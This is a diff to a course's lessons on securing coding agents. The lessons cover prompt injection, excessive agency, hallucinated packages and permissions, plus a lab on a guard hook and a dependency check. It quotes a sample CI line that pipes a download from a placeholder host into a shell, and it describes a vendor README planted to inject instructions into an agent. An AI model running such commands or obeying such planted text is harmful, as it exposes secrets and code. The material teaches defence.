@@ -6,8 +6,12 @@
 
 ---
 
+> **Dated note (November 2026).** OWASP's 2026 LLM Top 10 (August 2026) keeps prompt injection first and moves excessive agency to third. This lesson uses the 2025 codes; the full 2026 list was not available to check. Agent-specific risks: OWASP Top 10 for Agentic Applications (ASI).
+
 # 8.1 — When an agent has your keyboard: injection, secrets, destructive commands, hallucinated packages, permissions and sandboxes
 *Level: 🟡 Intermediate* · *Prerequisites: 5.1* · *Focus: Secure*
+
+**After this you can** fill in a threat-model worksheet for an agent session and recover a repository from a destructive reset with the reflog. *Study time: about 110 minutes (estimate).*
 
 ## ⚡ In 60 seconds
 - **The agent has your hands.** Whatever your account can read, run, delete, send or push, it can.
@@ -56,7 +60,8 @@ These are demonstrations and disclosures, mostly from security vendors, not atta
 | Untrusted content | A vendor README, issue text, web pages | Read it yourself first |
 | A way out | `curl`, `git push`, a pull request, an MCP tool | Deny push; ask on `curl`; sandbox with no allowed domains |
 
-**Excessive agency** (OWASP LLM06) has three roots: unneeded tools, a token broader than the task, irreversible actions with no human. The Cursor report above shows the last two.
+**Excessive agency** (OWASP LLM06:2025) has three roots: unneeded tools, a token broader than the task, irreversible actions with no human. The Cursor report above shows the last two.
+
 
 ### 🟡 Going deeper
 
@@ -80,11 +85,11 @@ Hygiene, cheapest first: a **person** adds dependencies (CONTRIBUTING.md: a tick
 +        run: curl -s https://get.csvtidy.example.invalid/setup.sh | sh
 ```
 
-Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would, and anyone can register a name an agent invents: slopsquatting. Neither is on the allow-list.
+Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would. Neither is on the allow-list.
 
 **Insecure generated code.** Pearce et al. found about 40 percent of 1,689 Copilot programs vulnerable (a 2021-era tool); Perry et al. (CCS 2023), in one user study of an early assistant, found users wrote significantly less secure code yet were more likely to believe it secure. Results depend on task, tool and date: a reason to review, not a rate. Remit has a planted example, `Store.search_by_name`; find it with the security pass of lesson 5.1.
 
-**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)). Najm's rules: approved tools in approved environments; no Confidential or Restricted data and no secrets in prompts or agent contexts.
+**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)).
 
 **Prompt for the safe path.**
 
@@ -288,7 +293,7 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 
 ## 📚 References
 - Claude Code documentation: permissions https://code.claude.com/docs/en/permissions; permission modes https://code.claude.com/docs/en/permission-modes; sandboxing https://code.claude.com/docs/en/sandboxing; hooks https://code.claude.com/docs/en/hooks; MCP https://code.claude.com/docs/en/mcp; security https://code.claude.com/docs/en/security; data usage https://code.claude.com/docs/en/data-usage
-- OWASP Top 10 for LLM Applications (LLM01 Prompt Injection, LLM06 Excessive Agency): https://genai.owasp.org/llm-top-10/
+- OWASP Top 10 for LLM Applications 2025 (LLM01:2025 Prompt Injection, LLM06:2025 Excessive Agency): https://genai.owasp.org/llm-top-10/
 - [*Secure AI & Application Security*, lesson 8.2 — Prompt injection and jailbreaks, direct and indirect](../secai/index.html#/8.2); [*Secure AI*, lesson 9.2 — Agents and tools: excessive agency, least-privilege tools and MCP](../secai/index.html#/9.2); [*Secure AI*, lesson 6.2 — The software supply chain: dependencies, SBOMs, SLSA and signing](../secai/index.html#/6.2); [*Secure AI*, lesson 6.3 — Securing AI-generated code: what coding agents get wrong](../secai/index.html#/6.3)
 - **Go deeper.** Invariant Labs, tool poisoning: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks · Invariant Labs, GitHub MCP: https://invariantlabs.ai/blog/mcp-github-vulnerability · Simon Willison, the lethal trifecta: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ · Spracklen et al.: https://www.usenix.org/conference/usenixsecurity25/presentation/spracklen · Pearce et al.: https://arxiv.org/pdf/2108.09293 · Perry et al.: https://arxiv.org/pdf/2211.03622
 
@@ -296,6 +301,8 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 
 # 8.2 — Lab: harden your setup with permissions, a guard hook and a dependency check
 *Level: 🟡 Intermediate* · *Prerequisites: 8.1* · *Focus: Secure, Automate*
+
+**After this you can** configure agent permissions, a guard hook and a dependency check that each pass the grader. *Study time: about 110 minutes (estimate).*
 
 ## ⚡ In 60 seconds
 - **Lab m08, needs an agent: no.** Four things in Remit: `.claude/settings.json`, a guard hook, a dependency check, and notes on a suspicious README. An agent can help with parts 1 to 3.
@@ -328,7 +335,7 @@ Lujain's agent proposed installing `invented-csvtidy-extras`, and the vendor REA
 
 Your script answers with its exit code.
 
-In your lab folder, test by hand, safely, since a sample is only text: `python .claude/hooks/guard.py < lab-assets/hook-samples/block-git-push.json; echo "exit=$?"`. Copy `lab-assets/guard_skeleton.py` to `.claude/hooks/guard.py` (`mkdir -p .claude/hooks` first; its first line only labels it for the course repository). It lets everything through:
+In your lab folder, test by hand, safely, since a sample is only text: `python .claude/hooks/guard.py < lab-assets/hook-samples/block-git-push.json; echo "exit=$?"`. Copy `lab-assets/guard_skeleton.py` to `.claude/hooks/guard.py` (`mkdir -p .claude/hooks` first). It lets everything through:
 
 ```python
 # ailab/labs/m08_harden/assets/guard_skeleton.py
@@ -409,7 +416,7 @@ From tokens you can split into commands, find each program (skipping `VAR=value`
 }
 ```
 
-Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session (no tool, or an agent that cannot open one), run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it.
+Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session, run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it.
 **The dependency check.** Names are compared after normalising, so `Typing_Helpers` equals `typing-helpers`, but `colorlib` for `colourlib` is a different package: flag it. Extras, markers, comments, `-r` lines and `--hash=` lines are not packages. From your lab folder, on the sample project:
 
 ```text
@@ -532,7 +539,7 @@ python -m ailab start m08 --dir ~/ainative/m08
 cd ~/ainative/m08    # your lab folder
 ```
 
-**Your move.** (1) Read `TASK.md`, then the vendor README yourself, as text. (2) Write tests for the guard from the ticket's rules, then `guard.py`, feeding samples with `<`. (3) Write `.claude/settings.json`. (4) Write the dependency check and `deps-allowlist.txt`; try it on `lab-assets/sample-project`. (5) Fill in `injection-notes.md`. (6) Commit each part with its tests and code, so `pytest -q` stays green, then grade. The grader gives `pytest -q` 60 seconds: call your functions directly for long lists of commands, and use a subprocess for a few exit-code tests. With an agent (parts 1 to 3): hand it the ticket and samples, ask for failing tests first, stay in default mode (it asks before it edits or runs) and read every diff; review its guard like a stranger's. Part 4 is yours: an agent exploring the repository reads that README unprompted, which is the attack, so keep it away from `lab-assets/vendor-readme/`.
+**Your move.** (1) Read `TASK.md`, then the vendor README yourself, as text. (2) Write tests for the guard from the ticket's rules, then `guard.py`, feeding samples with `<`. (3) Write `.claude/settings.json`. (4) Write the dependency check and `deps-allowlist.txt`; try it on `lab-assets/sample-project`. (5) Fill in `injection-notes.md`. (6) Commit each part with its tests and code, so `pytest -q` stays green, then grade. The grader gives `pytest -q` 60 seconds: call your functions directly for long lists of commands, and use a subprocess for a few exit-code tests. With an agent (parts 1 to 3): hand it the ticket and samples, ask for failing tests first, stay in default mode and read every diff; review its guard like a stranger's. Part 4 is yours: an agent exploring the repository reads that README unprompted, which is the attack, so keep it away from `lab-assets/vendor-readme/`.
 
 **What the grader checks.** Settings: valid rules, denies that cover the secrets, `git push` and `rm -rf` without stopping everyday work, no broad allow, the hook registered. Guard: dangerous samples blocked, harmless ones (heredocs included) allowed, unreadable input blocked. Dependency check: 18 small projects and your own repository. Notes: four sections, three of five tricks. Hygiene: tests, scope, secrets, commits.
 
